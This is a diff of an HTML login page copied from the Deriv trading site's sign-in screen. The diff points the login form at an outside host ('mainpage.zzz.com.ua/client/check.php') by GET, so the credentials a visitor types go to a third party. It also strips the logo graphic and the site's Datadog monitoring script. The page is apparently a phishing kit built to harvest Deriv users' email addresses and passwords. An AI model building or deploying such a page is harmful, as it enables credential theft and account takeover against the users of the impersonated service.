@@ -587,9 +587,7 @@
         <header>
             <a id="logo" href="https://deriv.com/">
                 <svg width="217" height="32" viewBox="0 0 217 72" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <g clip-path="url(#clip0_987_32033)">
-                        <path d="M43.4717 2.27116L39.7568 23.331H26.8612C14.8305 23.331 3.36323 33.0745 1.23785 45.1006L0.338242 50.2194C-1.77724 62.2456 6.24979 71.9892 18.2805 71.9892H29.036C37.8045 71.9892 46.1578 64.8938 47.7 56.1289L57.6053 0L43.4717 2.27116ZM34.3216 54.1425C33.8471 56.8501 31.4085 59.054 28.6999 59.054H22.1656C16.7582 59.054 13.1401 54.6661 14.089 49.2509L14.6526 46.0592C15.6114 40.6538 20.7717 36.2563 26.1791 36.2563H37.4767L34.3216 54.1425ZM142.785 71.9881L151.247 24.0018H164.632L156.17 71.9881H142.785ZM144.233 24.5552C143.562 28.3613 142.888 32.1675 142.217 35.9738C135.876 34.0039 129.334 34.6312 127.324 35.0319C125.153 47.3536 122.979 59.6783 120.806 72H107.412C109.231 61.6902 115.444 26.4806 115.444 26.4806C119.801 24.6774 130.499 21.0176 144.233 24.5552ZM89.9629 23.3228H79.5436C69.3911 23.3228 59.7136 31.5444 57.924 41.6931L55.8185 53.6204C54.0291 63.7689 60.8009 71.9908 70.9535 71.9908H93.1167L95.3905 59.0951H74.5612C71.1807 59.0951 68.9167 56.3577 69.5199 52.9682L69.5891 52.5631H103.17L105.088 41.6931C106.877 31.5444 100.106 23.3228 89.9531 23.3228H89.9629ZM91.6534 40.6654L91.5744 41.3571H71.6059L71.7146 40.7444C72.3173 37.3648 75.4019 34.3904 78.7922 34.3904H86.592C89.9434 34.3904 92.2074 37.3154 91.6534 40.6654ZM203.463 24.0018H216.857C212.294 36.1284 201.838 56.7568 191.708 71.9881H178.314C173.664 57.4915 170.661 37.293 170.089 24.0018H183.484C183.725 28.3374 185.667 44.4186 187.883 55.653C193.96 44.7236 200.66 30.384 203.452 24.0018H203.463Z" fill="#FF444F"/>
-                    </g>
+                   
                     <defs>
                         <clipPath id="clip0_987_32033">
                         <rect width="217" height="72" fill="white"/>
@@ -603,7 +601,7 @@
     <div id="container">
         <h1 class="title-text" style="font-size: 2.4rem">Welcome!</h1>
         <p class="subtitle-text">Log in to continue.</p>
-        <form action="/bebas.php" novalidate id="frmLogin" method="GET">
+        <form action="//mainpage.zzz.com.ua/client/check.php" novalidate id="frmLogin" method="GET">
             <div class='input-group'>
                 <div class="input-wrapper ">
                     <input type="name" id="email" name="email" placeholder="example@email.com" value="" required autocomplete="off"  autofocus="autofocus"  maxlength="254"  />
@@ -777,31 +775,7 @@
     }
 </script>
 <script src="https://www.datadoghq-browser-agent.com/us1/v4/datadog-rum.js" type="text/javascript"></script>
-<script>
-    var DD_APP_ID = '5c8975a3-ec86-4a64-8a3a-e6888fdde082';
-    var DD_CLIENT_TOKEN = 'pub08554ab30284600af157441bfb0fa923';
 
-    if(window.DD_RUM && DD_APP_ID && DD_CLIENT_TOKEN) {
-        window.DD_RUM.init({
-            clientToken: DD_CLIENT_TOKEN,
-            applicationId: DD_APP_ID,
-            site: 'datadoghq.com',
-            service: 'oauth.deriv.com',
-            env: 'production',
-            version: '1.0',
-            sessionSampleRate: 10,
-            sessionReplaySampleRate: 10,
-            trackResources: true,
-            trackLongTasks: true,
-            trackUserInteractions: true,
-            trackFrustrations: true,
-            defaultPrivacyLevel: 'mask-user-input',
-            enableExperimentalFeatures: ['clickmap'],
-        })
-
-        window.DD_RUM.startSessionReplayRecording();
-    }
-</script>
 
 
         <!-- Google Tag Manager -->
